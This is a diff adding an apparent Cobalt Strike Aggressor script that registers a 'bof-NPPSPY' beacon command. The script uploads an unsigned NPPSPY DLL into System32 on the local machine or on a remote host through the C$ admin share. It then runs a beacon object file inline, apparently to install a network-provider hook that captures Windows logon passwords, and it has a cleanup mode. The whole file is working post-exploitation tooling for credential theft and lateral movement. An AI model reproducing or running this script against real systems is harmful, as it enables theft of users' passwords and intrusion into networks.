@@ -1,0 +1,66 @@
+beacon_command_register("bof-NPPSPY", "bof implementation of NPPSPY", 
+"===Local usage===
+Command: bof-NPPSPY local
+
+===Remote usage===
+Command: bof-NPPSPY WS01
+
+===Cleanup mode===
+Local:
+Command: bof-NPPSPY local cleanup <cleanupValue>
+Remote:
+Command: bof-NPPSPY WS01 cleanup <cleanupValue>");
+
+alias bof-NPPSPY {
+	local('$args');
+	$barch  = barch($1);
+	
+	if(size(@_) < 2){
+		berror($1, "Missing arugment. Example: bof-NPPSPY local/hostname NPPSPY.dll");
+		return;
+	}
+	$targetHost = $2;
+	$mode = $3;
+	if($mode eq "cleanup"){
+		$cleanup = int(1);
+		$cleanupValue = $4;
+		if(strlen($cleanupValue) == 0){
+			berror($1, "Cleanup value is empty. Please provide the cleanup value provided in BOF output.");
+			return;
+		}
+		$args = bof_pack($1, "ziz", $targetHost, $cleanup, $cleanupValue);
+		$handle = openf(script_resource("bof-NPPSPY $+ $barch $+ .o"));
+		$data = readb($handle, -1);
+		closef($handle);
+		beacon_inline_execute($1, $data, "go", $args);
+	}else{
+		$DLLhandle = openf(script_resource("dist/NPPSPY.dll"));
+		$DLLdata = readb($DLLhandle, -1);
+		closef($DLLhandle);
+		if(strlen($DLLdata) == 0){
+			berror($1, "File is empty or not exit. Please use a valid file.");
+			return;
+		}
+		if($targetHost eq "local"){
+		$uploadpath = "C:\\Windows\\System32\\NPPSPY.dll";
+		# upload the dll
+        bupload_raw($1, $uploadpath, $DLLdata);
+		blog($1, "[!] An unsigned NPPSPY DLL will be uploaded to: ". $uploadpath);
+		}
+		else{
+		$uploadpath = "\\\\" . $targetHost . "\\C$\\Windows\\System32\\NPPSPY.dll";
+		bupload_raw($1, $uploadpath, $DLLdata);
+		blog($1, "[!] An unsigned NPPSPY DLL will be uploaded to: ". $uploadpath);
+		}
+		$args = bof_pack($1, "z", $targetHost);
+		$handle = openf(script_resource("bof-NPPSPY $+ $barch $+ .o"));
+		$data = readb($handle, -1);
+		closef($handle);
+		if(strlen($data) < 1)
+		{
+			berror($1,"Error: BOF could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
